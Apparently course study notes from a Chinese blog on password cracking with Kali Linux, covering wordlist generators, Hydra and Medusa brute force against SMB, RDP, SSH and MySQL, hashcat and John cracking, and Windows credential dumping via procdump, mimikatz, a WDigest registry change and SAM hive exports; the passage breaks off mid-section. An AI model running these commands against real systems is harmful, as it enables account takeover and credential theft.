<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Kali Linux渗透测试——密码破解 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Kali Linux渗透测试——密码破解" />
<meta property="og:description" content="笔记内容参考安全牛课堂苑房弘老师的Kali Linux渗透测试教程
当目标系统无任何已知漏洞时，可以考虑社会工程学或者获取目标系统的用户身份，通过合法账户登录绕过系统的安全防线。账户登录身份认证包括账号密码、passphrase、密保、手机、指纹、声纹、面部识别等，其中账号密码是安全级别较低的认证方式，基于互联网的身份认证仍以账号密码为主要形式。
密码破解的方法通常有基于社会工程学的人工猜测、基于字典的暴力破解以及基于中间人攻击的密码嗅探。
文章目录 一、字典（一）Crunch（二）Cupp（三）Cewl（四）John the Ripper 二、在线破解（一）Hydra（二）Medusa 三、离线破解（一）获取HASH（二）识别HASH（三）碰撞破解 四、密码嗅探（一）基本原理（二）攻击实现 五、Pass the HASH（PTH） 一、字典 字典是暴力破解的基础，根据已有信息生成精简高效、命中率高的字典是暴破成功的关键。通用字典资源可以直接拿来用，如下：
Kali自带字典：在/usr/share/wordlist/、/usr/share/wfuzz/wordlist/等目录中可以找到，比如用rockyou来破解登录密码
GItHub开源项目：https://github.com/danielmiessler/SecLists，不仅对密码字典进行了分类，还包括用户名、文件名、网站子目录、DNS路径等字典信息
其他需要结合已有信息生成高效的字典，这里介绍四种字典生成工具：
（一）Crunch 强大的字典生成工具，基本规则：crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]
eg：
crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100 # -b 按大小分割字典（kb/kib、 mb/mib、 gb/gib） # -c 按行数分割字典 # 以上两个参数必须与-o START结合使用，-o START为按顺序排列字典 # -d 同一字符最多连续出现数量，如果使用-t参数，则-d后要跟上不重复字符的类型，如-d@或-d%^ crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt # 指定charset.lst中的字符集 crunch 4 5 -p dog tiger bird crunch 1 1 -p 1234567890 # 在指定的参数中排列组合（无重复） # -p必须是最后一个参数，与-s 参数不兼容（-s指定起始字符串） # 最大、最小字符长度失效，但必须存在 crunch 6 6 -t @,%%^^ -z 7z # @ 代表小写字母 lalpha # , 代表大写字母 ualpha # % 代表数字 numeric # ^ 代表符号 symbols # 输出压缩文件，7z压缩比率最大 crunch 1 1 -q word # 读取word文件每行内容作为基本字符生成字典 # 最大、最小字符长度失效，但必须存在 crunch 5 5 abc DEF &#43; \!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/51f47f9dce814115c146557d87adb0b8/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-03-06T22:35:49+08:00" />
<meta property="article:modified_time" content="2022-03-06T22:35:49+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Kali Linux渗透测试——密码破解</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <blockquote> 
 <p>笔记内容参考安全牛课堂苑房弘老师的Kali Linux渗透测试教程</p> 
</blockquote> 
<blockquote> 
 <p>当目标系统无任何已知漏洞时，可以考虑社会工程学或者获取目标系统的用户身份，通过合法账户登录绕过系统的安全防线。账户登录身份认证包括账号密码、passphrase、密保、手机、指纹、声纹、面部识别等，其中<strong>账号密码是安全级别较低的认证方式</strong>，基于互联网的身份认证仍以账号密码为主要形式。<br><br> 密码破解的方法通常有<strong>基于社会工程学的<font color="red">人工猜测</font></strong>、<strong>基于字典的<font color="red">暴力破解</font></strong>以及<strong>基于中间人攻击的<font color="red">密码嗅探</font></strong>。</p> 
</blockquote> 
<p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><ul><li><a href="#_6" rel="nofollow">一、字典</a></li><li><ul><li><a href="#Crunch_14" rel="nofollow">（一）Crunch</a></li><li><a href="#Cupp_54" rel="nofollow">（二）Cupp</a></li><li><a href="#Cewl_60" rel="nofollow">（三）Cewl</a></li><li><a href="#John_the_Ripper_72" rel="nofollow">（四）John the Ripper</a></li></ul> 
   </li><li><a href="#_97" rel="nofollow">二、在线破解</a></li><li><ul><li><a href="#Hydra_99" rel="nofollow">（一）Hydra</a></li><li><a href="#Medusa_127" rel="nofollow">（二）Medusa</a></li></ul> 
   </li><li><a href="#_151" rel="nofollow">三、离线破解</a></li><li><ul><li><a href="#HASH_160" rel="nofollow">（一）获取HASH</a></li><li><a href="#HASH_212" rel="nofollow">（二）识别HASH</a></li><li><a href="#_220" rel="nofollow">（三）碰撞破解</a></li></ul> 
   </li><li><a href="#_419" rel="nofollow">四、密码嗅探</a></li><li><ul><li><a href="#_424" rel="nofollow">（一）基本原理</a></li><li><a href="#_466" rel="nofollow">（二）攻击实现</a></li></ul> 
   </li><li><a href="#Pass_the_HASHPTH_592" rel="nofollow">五、Pass the HASH（PTH）</a></li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h3><a id="_6"></a>一、字典</h3> 
<p>字典是暴力破解的基础，根据已有信息生成精简高效、命中率高的字典是暴破成功的关键。通用字典资源可以直接拿来用，如下：</p> 
<ul><li> <p>Kali自带字典：在<code>/usr/share/wordlist/</code>、<code>/usr/share/wfuzz/wordlist/</code>等目录中可以找到，比如用<code>rockyou</code>来破解登录密码</p> </li><li> <p>GItHub开源项目：<a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a>，不仅对密码字典进行了分类，还包括用户名、文件名、网站子目录、DNS路径等字典信息</p> </li></ul> 
<p>其他需要结合已有信息生成高效的字典，这里介绍四种字典生成工具：</p> 
<h4><a id="Crunch_14"></a>（一）Crunch</h4> 
<p>强大的字典生成工具，<strong>基本规则：crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</strong><br> eg：</p> 
<pre><code class="prism language-bash">crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100 
<span class="token comment"># -b 按大小分割字典（kb/kib、 mb/mib、 gb/gib）</span>
<span class="token comment"># -c 按行数分割字典</span>
<span class="token comment"># 以上两个参数必须与-o START结合使用，-o START为按顺序排列字典</span>
<span class="token comment"># -d 同一字符最多连续出现数量，如果使用-t参数，则-d后要跟上不重复字符的类型，如-d@或-d%^</span>

crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt
<span class="token comment"># 指定charset.lst中的字符集</span>

crunch 4 5 -p dog tiger bird
crunch 1 1 -p 1234567890
<span class="token comment"># 在指定的参数中排列组合（无重复）</span>
<span class="token comment"># -p必须是最后一个参数，与-s 参数不兼容（-s指定起始字符串）</span>
<span class="token comment"># 最大、最小字符长度失效，但必须存在</span>

crunch 6 6 -t @,%%^^ -z 7z
<span class="token comment"># @ 代表小写字母 lalpha</span>
<span class="token comment"># , 代表大写字母 ualpha</span>
<span class="token comment"># % 代表数字 numeric</span>
<span class="token comment"># ^ 代表符号 symbols</span>
<span class="token comment"># 输出压缩文件，7z压缩比率最大</span>

crunch 1 1 -q word
<span class="token comment"># 读取word文件每行内容作为基本字符生成字典</span>
<span class="token comment"># 最大、最小字符长度失效，但必须存在</span>

crunch 5 5 abc DEF + \<span class="token operator">!</span>@<span class="token comment"># -t ,@^%,</span>
<span class="token comment"># + 占位符，如果不使用指定的字符集，则需要使用加号占位；这里没有指定数字字符集，而是采用默认的0123456789，所以用+来占位</span>
<span class="token comment"># \ 转义符（转义空格、符号）</span>

crunch 5 5 -t ddd%% -p dog drag bird
<span class="token comment"># 任何不同于,@^%以及-p指定的值都是占位符</span>

crunch 2 4 0123456789 <span class="token operator">|</span> aircrack-ng a.cap -e MyESSID -w -
<span class="token comment"># 为节省空间，可以将生成的字典直接作为输入给爆破程序使用</span>
</code></pre> 
<h4><a id="Cupp_54"></a>（二）Cupp</h4> 
<p>交互输入信息，按输入的信息生成专属的密码字典，需要在GitHub上下载。</p> 
<pre><code class="prism language-bash"><span class="token function">git</span> clone https://github.com/Mebus/cupp.git
./cupp.py -i      <span class="token comment">#交互输入信息</span>
</code></pre> 
<h4><a id="Cewl_60"></a>（三）Cewl</h4> 
<p>在破解具体门户网站用户的密码时，可以结合网站中出现频率较高的关键词，通过收集网站信息生成字典。<br> eg：</p> 
<pre><code class="prism language-bash">cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt
<span class="token comment"># -m：最小单词长度</span>
<span class="token comment"># -d：爬网深度</span>
<span class="token comment"># -e：收集包含email地址信息</span>
<span class="token comment"># -c：显示每个单词出现次数</span>
<span class="token comment"># 支持代理</span>
</code></pre> 
<p>通过cewl查找到的素材往往需要经过筛选，作为爆破字典的一部分使用。同时要考虑将关键词进行变型，如末尾增加数字、大小写变化、字符与字符数字相互转换等，通常<font color="red"><strong>结合John等其他字典生成工具使用</strong></font>。</p> 
<h4><a id="John_the_Ripper_72"></a>（四）John the Ripper</h4> 
<p>John本身是一个功能强大的<strong>离线密码破解工具</strong>，同时能让我们在已有字典基础上外加规则，将基础词汇变型，得到词汇更加丰富的字典。实现字典词汇的动态变型，首先要在John的配置文件<code>/etc/john/john.conf</code>中修改规则，在配置文件中有很多section，以中括号标志，在section中可以定制自己需要的规则。<br> eg:</p> 
<pre><code class="prism language-bash"><span class="token comment"># 在[List.Rules:Wordlist]中存放了对基础字典进行变型的规则，使用password.lst时自动调用</span>
<span class="token comment"># 在[List.Rules:Wordlist]中添加内容，表示在原有字典基础上末尾加数字进行扩展</span>
<span class="token punctuation">[</span>List.Rules:Wordlist<span class="token punctuation">]</span>
$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>
$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>
$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>

<span class="token comment"># 修改后使用命令</span>
john --wordlist<span class="token operator">=</span>cewl.txt --rules --stdout <span class="token operator">&gt;</span> m.txt
<span class="token comment"># --wordlist指定已有的基础字典cewl.txt</span>
<span class="token comment"># --rules表示调用配置文件中的规则，默认为Wordlist</span>
</code></pre> 
<p>也可以自己生成字典规则进行使用，如在配置文件中添加：</p> 
<pre><code class="prism language-bash"><span class="token punctuation">[</span>List.Rules:test<span class="token punctuation">]</span>
$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>$<span class="token punctuation">[</span>a-zA-Z<span class="token punctuation">]</span>
$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>$<span class="token punctuation">[</span>0-9<span class="token punctuation">]</span>$<span class="token punctuation">[</span>a-zA-Z<span class="token punctuation">]</span>$<span class="token punctuation">[</span>a-zA-Z<span class="token punctuation">]</span>$<span class="token punctuation">[</span>a-zA-Z<span class="token punctuation">]</span>$<span class="token punctuation">[</span>~<span class="token operator">!</span>@<span class="token comment">#$%^&amp;*()\-_=+]</span>
<span class="token comment"># 修改后使用命令</span>
john --wordlist<span class="token operator">=</span>cewl.txt --rules<span class="token operator">=</span>test --stdout <span class="token operator">&gt;</span> m.txt
<span class="token comment">#当rules规则不是用默认的Wordlist时，需要用--rules指定</span>
</code></pre> 
<h3><a id="_97"></a>二、在线破解</h3> 
<p>在线破解的基本原理是：<strong>利用工具不断给目标主机发送验证请求，通过响应信息判断是否成功登陆</strong>。当目标主机设置了较完善的登陆限制时（锁定阈值、单位时间请求限制等），破解效率较低。</p> 
<h4><a id="Hydra_99"></a>（一）Hydra</h4> 
<ul><li>优势：速度非常快，支持协议多</li><li>劣势：运行不稳定；速度太快，以至于有些服务会拒绝响应；每主机新建进程，浪费资源</li></ul> 
<p><strong>基本规则：hydra server service [options]</strong></p> 
<p>eg:</p> 
<pre><code class="prism language-bash">hydra -l administrator -P pass.lst smb://1.1.1.1/admin$ -vV
hydra -l administrator -P pass.lst rdp://1.1.1.1 -t 1 -vV
<span class="token comment"># admin$ 是windows系统中的共享文件</span>
<span class="token comment"># -t ：主机并发登录数量限制</span>

hydra -L user.lst -P pass.lst ftp://1.1.1.1 -s 2121 -e nsr -o p.txt
<span class="token comment"># -s :当服务开启的不是默认端口时用来指定端口</span>
<span class="token comment"># -e nsr ：添加空密码、用户名以及用户名倒序的检查</span>
<span class="token comment"># -o ：将找到的login/password写入指定文件</span>
</code></pre> 
<p>Hydra中还自带了用于筛选字典的工具 <strong>pw-inspector</strong>，可以基于已有字典进行筛选。<br> eg:</p> 
<pre><code class="prism language-bash">pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l -m 6 -M 7
<span class="token comment"># -l ：筛选小写字母集</span>
<span class="token comment"># -m ：筛选最小长度</span>
<span class="token comment"># -M ：筛选最大长度</span>
</code></pre> 
<p>注：Hydra支持表单破解，但功能有些鸡肋，表单破解建议使用Burp Suite</p> 
<h4><a id="Medusa_127"></a>（二）Medusa</h4> 
<ul><li>优势：运行稳定，速度控制得当；基于线程运行</li><li>劣势：支持协议有待完善（目前仍不支持RDP）</li></ul> 
<p><strong>基本规则：medusa -M modules [options]</strong></p> 
<p>eg:</p> 
<pre><code class="prism language-bash"><span class="token comment"># 查看支持模块</span>
medusa -d

<span class="token comment"># 破解windows密码</span>
medusa -M smbnt -h 1.1.1.1 -u administrator -P pass.lst -n 4455 -e ns -F
<span class="token comment"># -n ：当服务开启的不是默认端口时用来指定端口</span>
<span class="token comment"># -e ns ：检查空密码和用户名</span>
<span class="token comment"># -F ： 找到正确密码后停止继续检查</span>

<span class="token comment"># 破解Linux SSH密码</span>
medusa -M <span class="token function">ssh</span> -h 192.168.20.10 -u root -P pass.lst -e ns -t 3 –F
<span class="token comment"># -t ： 主机并发登录数量限制</span>

<span class="token comment"># mysql服务密码破解</span>
medusa -M mysql -h 1.1.1.1 -u root -P pass.lst -e ns -F
</code></pre> 
<h3><a id="_151"></a>三、离线破解</h3> 
<p>计算机利用单向HASH算法，将密码映射成HASH值存储，在线破解的基本原理即<strong>设法获取这些HASH值，然后利用工具进行碰撞破解或者采用PTH</strong>。HASH加密算法包括MD5、MD4、SHA128、SHA256等，不同的HASH类型碰撞破解方法不同，基本思路：</p> 
<ul><li>获取密码HASH</li><li>识别HASH类型</li><li>利用离线破解工具碰撞密码HASH</li></ul> 
<p>相比于在线破解的优势：</p> 
<ul><li>不会触发密码锁定、登录限制等安全机制</li><li>不会产生大量登陆失败日志引起管理员注意</li></ul> 
<h4><a id="HASH_160"></a>（一）获取HASH</h4> 
<p><font color="red"><strong>Windows系统登录后SAM文件是被锁死的，不能复制、移动，正常情况下打开是乱码或空白，窃取SAM文件可以登录并提权后用mimikatz、wce、procdump等工具，或者采取物理接触等非登录手段。</strong></font></p> 
<h5>1.shell登陆</h5> 
<p>取得shell并提权后：</p> 
<p>（1）通过工具获取HASH值：mimikatz、wce等，参见：<br> <a href="https://blog.csdn.net/Captain_RB/article/details/104504978">Kali Linux渗透测试——提权</a></p> 
<p>（2）利用procdump，通过lsass进程获取内存的转储文件，然后用mimikatz读取，命令如下：</p> 
<pre><code class="prism language-powershell"><span class="token comment">#首先获取lsass进程内存</span>
procdump<span class="token punctuation">.</span>exe <span class="token operator">-</span>accepteula <span class="token operator">-</span>ma lsass<span class="token punctuation">.</span>exe lsass<span class="token punctuation">.</span>dmp

<span class="token comment">#然后用管理员身份打开mimikatz，查看dmp文件信息</span>
mimikatz
log mimikatz<span class="token punctuation">.</span>log
privilege::debug
sekurlsa::minidump lsass<span class="token punctuation">.</span>dmp
sekurlsa::logonpasswords
<span class="token comment">#注意：尽量去github下载最新版本的mimikatz，不然可能无法读取新版本系统的dmp文件</span>
</code></pre> 
<p>用procdump通过lsass进程获取内存的dmp转储文件的过程，等同于在<code>taskmgr</code>中找到lsass.exe进程，然后<code>右键-&gt;创建转储文件</code>，根据弹窗路径找到dmp文件。</p> 
<p><font color="red"><strong>注意：server 2012/windows 8系统之后默认不会在内存中保存明文密码，但可以通过以下命令修改，修改之后需要用户重新登录起效：</strong></font></p> 
<pre><code class="prism language-powershell">reg add hklm\system\currentcontrolset\control\securityproviders\wdigest <span class="token operator">/</span>v UseLogonCredential <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 1 <span class="token operator">/</span>f
<span class="token comment"># /v：要添加的注册表键的名称</span>
<span class="token comment"># /t：要添加的注册表类型</span>
<span class="token comment"># /f：覆盖不提醒</span>
<span class="token comment"># /d：添加的值</span>
</code></pre> 
<p>（3）利用cmd命令导出注册表中sam的相关信息，保存的hive文件可以用cain读取：</p> 
<pre><code class="prism language-powershell">reg save hklm\sam c:\sam<span class="token punctuation">.</span>hive
reg save hklm\system c:\system<span class="token punctuation">.</span>hive
reg save hklm\security c:\security<span class="token punctuation">.</span>hive
</code></pre> 
<h5>2.物理接触</h5> 
<p>首先通过Kali ISO启动Live模式虚拟机，然后利用samdump2工具：</p> 
<pre><code class="prism language-bash"><span class="token function">mount</span> /dev/sda1 /mnt             <span class="token comment">#挂载Windows主机磁盘</span>
<span class="token function">cd</span> /mnt/Windows/System32/config  <span class="token comment">#SAM文件存放位置</span>
samdump2 SYSTEM SAM -o sam.hash  
</code></pre> 
<p>获取HASH文件后，可以用 <strong>nc</strong> 等工具进行传输</p> 
<h4><a id="HASH_212"></a>（二）识别HASH</h4> 
<p>一些离线破解工具自带HASH算法识别功能，也可以利用专用识别工具如：</p> 
<ul><li><strong>hash‐identifier</strong></li><li><strong>hashid</strong></li></ul> 
<p><font color="red">一些常见的HASH算法长度：<strong>MD5（128bit、256bit）、SHA1（160bit）、SHA256（256bit）、SHA512（512bit）、NTLM（128bit）</strong></font></p> 
<p>注：可能识别错误或无法识别</p> 
<h4><a id="_220"></a>（三）碰撞破解</h4> 
<h5>1.Hashcat</h5> 
<p>强大的开源多线程密码破解工具，号称世界上最快的密码恢复工具，支持80多种加密算法破解，<strong>支持基于CPU、GPU计算能力破解</strong>。</p> 
<p><strong>常用有五种破解模式 (参数 <code>-a</code>)：</strong></p> 
<ul><li>0 Straight：字典破解</li><li>1 Combination：将字典中密码进行组合（1 2 &gt; 11 22 12 21）</li><li>3 Brute-force：指定字符集（或全部字符集）所有组合进行暴破</li><li>6 Hybrid Wordlist + Mask：混合字典+掩码组合</li><li>7 Hybrid Mask + Wordlist：混合掩码+字典组合</li></ul> 
<p><strong>常用HASH算法 (参数 <code>-m</code>)：</strong></p> 
<ul><li>0：MD5</li><li>1000：NTLM</li><li>1800：SHA512 ($6$)</li><li>11600：7-Zip</li><li>13000：RAR5</li><li>13600：WinZip</li></ul> 
<p>具体使用方法参加<code>--help</code>帮助文档</p> 
<p>基本规则：<strong>hashcat [options] hashfile [mask|wordfiles|directories]</strong></p> 
<p>eg1：基本使用</p> 
<pre><code class="prism language-bash">hashcat -b -m 1000 --force
<span class="token comment"># -b：查看系统性能针对特定算法的破解速度，这里-m 1000查看的是NTLM算法</span>
<span class="token comment"># 如果支持GPU破解，会列出GPU设备号以及破解性能</span>
<span class="token comment"># 虚拟机环境需要将CPU内核数量设置为1，并加上--force忽略警告，否则会报错</span>

hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d
<span class="token comment"># -a：指定破解模式，默认为模式0</span>
<span class="token comment"># -m：指定HASH算法</span>
<span class="token comment"># ?l：所有小写字符集</span>
<span class="token comment"># ?u：所有大写字符集</span>
<span class="token comment"># ?d：所有数字字符集</span>
<span class="token comment"># ?s：所有特殊符号字符集</span>
<span class="token comment"># ?a：以上所有字符集</span>

hashcat -m 1000 hash.dump pass.lst -D 2
<span class="token comment"># -m：指定HASH算法</span>
<span class="token comment"># -D：选择破解设备号，设备号利用 hashcat -b 命令查看，如GPU相应设备号为 Device #2</span>

hashcat -m 1000 -a 3 hash.dump --increment --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l
<span class="token comment"># --increment：开启increment模式</span>

</code></pre> 
<p>eg2：破解Linux系统账号密码</p> 
<p><font color="navy"><strong>Linux shadow文件记录格式为：<br> USERNAME:$HASH_ID$SALT$HASH:MODIFY_DATE:DISABLE_MODIFY_TIME:EXPIRE_TIME::::</strong></font></p> 
<p>例如：<code>root:$6$OvgkjqcxNCBY2Ypk$UXUteT4hFhn.HNbsgzCB86jOa0rtngw9N3mgPZZFn9PMHUDOvkjZwklz/R1KwG0WT42nA.1cBsGMPNTlW2hGA/:18181:0:99999:7:::</code></p> 
<p>其HASH值为：<br> <code>UXUteT4hFhn.HNbsgzCB86jOa0rtngw9N3mgPZZFn9PMHUDOvkjZwklz/R1KwG0WT42nA.1cBsGMPNTlW2hGA/</code></p> 
<pre><code class="prism language-bash">hashcat -a 0 -m 1800 \<span class="token variable">$6</span>\<span class="token variable">$OvgkjqcxNCBY2Ypk</span>\<span class="token variable">$UXUteT4hFhn</span>.HNbsgzCB86jOa0rtngw9N3mgPZZFn9PMHUDOvkjZwklz/R1KwG0WT42nA.1cBsGMPNTlW2hGA/ wordlist.txt -o crack.hash --force
<span class="token comment"># $在Linux环境下需要转义</span>
<span class="token comment"># 破解成功Status......:Cracked，破解失败Status......:Exhausted</span>
<span class="token comment"># 必须指定破解模式，-m 1800为 sha512crypt $6$, SHA512 (Unix)</span>
</code></pre> 
<p>eg3：破解Windows系统账号密码</p> 
<p><font color="navy"><strong>Windows sam文件记录格式为：<br> USERNAME:SID:LM-HASH:NT-HASH:::</strong></font></p> 
<p>例如：<br> <code>Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC:::</code></p> 
<p>LM-HASH字段为<code>AAD3B435B51404EEAAD3B435B51404EE</code>，说明其加密采用的是NT-HASH（即NTLM-HASH），HASH值为：<br> <code>683020925C5D8569C23AA724774CE6CC</code></p> 
<pre><code class="prism language-bash">hashcat -a 0 -m 1000 sam.ntlmhash wordlist.txt -o crack.hash --force
<span class="token comment"># sam.ntlmhash中仅保留NT-HASH部分</span>
</code></pre> 
<p><font color="red"><strong>注：<br> ① LM-HASH和NT-HASH是对同一个密码的两种不同加密方式，LM-HASH对大小写不敏感，加密速度快，安全性差，NT-HASH对大小写敏感，加密速度慢，安全性强；</strong></font></p> 
<p><font color="red"><strong>② 对于XP、Server 2003来说系统默认采用LM-HASH（往往会同时生成NT-HASH），之后的Win7、Server 2008等就禁用了LM-HASH，只采用NT-HASH，其LM-HASH部分可能填充为0或<code>AAD3B435B51404EEAAD3B435B51404EE</code>，该部分已失效；</strong></font></p> 
<p><font color="red"><strong>③ 用LM-HASH生成的Rainbow Table不能碰撞破解NT-HASH，但NT-HASH生成的Rainbow Table可以碰撞破解LM-HASH，因为LM-HASH加密往往会同时生成NT-HASH，而NT-HASH加密不会生成LM-HASH；</strong></font></p> 
<p><font color="red"><strong>④ 空密码的NT-HASH为<code>31d6cfe0d16ae931b73c59d7e0c089c0</code>，默认配置空密码不能远程桌面登录和访问共享文件</strong></font></p> 
<h5>2.oclHashcat</h5> 
<p>号称世界上最快、唯一的基于GPU的密码破解软件，免费开源、支持多平台、支持分布式、支持150+hash算法，对硬件要求较高：</p> 
<ul><li>虚拟机中无法使用</li><li>支持 CUDA 技术的Nvidia显卡</li><li>支持 OpenCL 技术的AMD显卡</li><li>安装相应的驱动</li></ul> 
<p>使用方法基本同Hashcat<br> eg：</p> 
<pre><code class="prism language-bash">oclHashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a?a
</code></pre> 
<p><em>最新版本kali已将oclHashcat移除，Hashcat本身已支持GPU破解</em></p> 
<h5>3.John the Ripper</h5> 
<p>功能强大的离线密码破解工具，支持众多服务应用的加密破解，<code>john --list=formats</code>查看支持服务，同时支持某些对称加密算法破解。</p> 
<p>默认破解模式分为三种，破解时依次运行：</p> 
<ul><li>Single crack：默认被首先执行，使用Login/GECOS信息尝试破解</li><li>Wordlist：基于规则的字典破解，主配文件中已指定 ‘Wordlist=$JOHN/password.lst’</li><li>Incremental：所有或指定字符集的暴力破解</li></ul> 
<p>eg1：破解Linux系统账号密码</p> 
<pre><code class="prism language-bash">john -test
<span class="token comment"># 查看系统性能针对每个算法的破解速度</span>

unshadow /etc/passwd /etc/shadow <span class="token operator">&gt;</span> pass.txt
<span class="token comment"># 合并passwd和shadow文件</span>

john pass.txt
<span class="token comment"># 按照single、wordlist、incremental模式依次运行</span>

<span class="token function">cat</span> ~/.john/john.pot
<span class="token comment"># 破解的密码信息存在~/.john/john.pot中</span>
</code></pre> 
<p>eg2：破解windows系统账号密码</p> 
<pre><code class="prism language-bash">john sam.dump -wordlist<span class="token operator">=</span>myPassword -format<span class="token operator">=</span>nt
<span class="token comment"># 指定字典为myPassword，指定HASH算法，而不是采用john检测的结果</span>
<span class="token comment"># Windows中HASH采用NTLM算法</span>

<span class="token function">cat</span> ~/.john/john.pot
<span class="token comment"># 查看破解结果</span>
</code></pre> 
<p>eg3：破解rar、zip等加密文件</p> 
<pre><code class="prism language-bash"><span class="token comment"># 以rar破解为例</span>
rar2john passwd.rar <span class="token operator">&gt;&gt;</span> rar.hash
<span class="token comment"># 内容为：wang.rar:$RAR3$*0*acf59f84ca43dda0*5e32875725a0b7128483237ea4c5024e:0::::wang.rar</span>
john rar.hash -wordlist<span class="token operator">=</span>wordlist.txt
<span class="token function">cat</span> ~/.john/john.pot
</code></pre> 
<p>rar2john提取HASH值后，也可以用hashcat进行破解：</p> 
<pre><code class="prism language-bash"><span class="token comment"># 保留其密钥信息：$RAR3$*0*acf59f84ca43dda0*5e32875725a0b7128483237ea4c5024e</span>
hashcat -h
<span class="token comment"># 查看HASH加密类型对应ID</span>
<span class="token comment"># RAR3-hp类型为12500</span>
<span class="token comment"># RAR5类型为13000</span>

hashcat -a 3 -m 12500 \<span class="token variable">$RAR3</span>\<span class="token variable">$*0*acf59f84ca43dda0*5e32875725a0b7128483237ea4c5024e</span> ?d?d?d?d?d?d -o crack.hash --force
</code></pre> 
<h5>4.RainbowCrack</h5> 
<p>基于时间记忆权衡技术生成彩虹表，提前计算密码的HASH值，通过比对HASH值破解密码，不用每次破解都重新计算，但是计算HASH的速度很慢，修改版可以支持CUDA GPU。</p> 
<p>彩虹表生成工具：RainbowCrack，下载地址： <a href="http://project-rainbowcrack.com/rainbowcrack-1.7-linux64.zip" rel="nofollow"> http://project-rainbowcrack.com/rainbowcrack-1.7-linux64.zip</a> ，基本命令（必须顺序使用）：</p> 
<ul><li><strong>rtgen</strong>：预计算，生成彩虹表，耗时的阶段</li><li><strong>rtsort</strong>：对rtgen生成的彩虹表进行排序</li><li><strong>rcrack</strong>：查找彩虹表破解密码</li></ul> 
<p>目前支持算法仅包括：LM、NTLM、MD5、SHA1、SHA256</p> 
<p>eg：</p> 
<pre><code class="prism language-bash"><span class="token comment">#下载解压并进入目录</span>
<span class="token function">wget</span> http://project-rainbowcrack.com/rainbowcrack-1.7-linux64.zip
unzip rainbowcrack-1.7-linux64.zip <span class="token operator">&amp;&amp;</span> <span class="token function">cd</span> rainbowcrack-1.7-linux64
<span class="token comment">#改变可执行文件的使用权限</span>
<span class="token function">chmod</span> 754 rcrack rt2rtc rtc2rt rtgen rtmerge rtsort

<span class="token comment">#./rtgen -h </span>
rtgen md5 loweralpha 1 7 0 1000 1000 0
rtgen md5 loweralpha 1 7 0 -bench
<span class="token comment">#-bench ：查看彩虹表生成速度</span>

<span class="token comment">#./rtsort -h </span>
rtsort /md5_loweralpha<span class="token comment">#1-7_0_1000x1000_0.rt </span>

<span class="token comment">#./rcrack -h </span>
rcrack *.rt -h 5d41402abc4b2a76b9719d911017c592
<span class="token comment">#用彩虹表爆破单个HASH</span>
rcrack *.rt -l hash.txt
<span class="token comment">#用彩虹表爆破HASH文件，每行一个HASH</span>
</code></pre> 
<p>计算彩虹表时间可能很长，所以一般下载彩虹表使用，常用网址：<br> <a href="https://freerainbowtables.com/" rel="nofollow">Free Rainbow Tables</a><br> <a href="http://project-rainbowcrack.com/table.htm" rel="nofollow">RainbowCrack Tables</a></p> 
<h5>5.在线破解</h5> 
<p>利用在线破解网站轻松跑出HASH，简单便捷，常用在线破解网站：</p> 
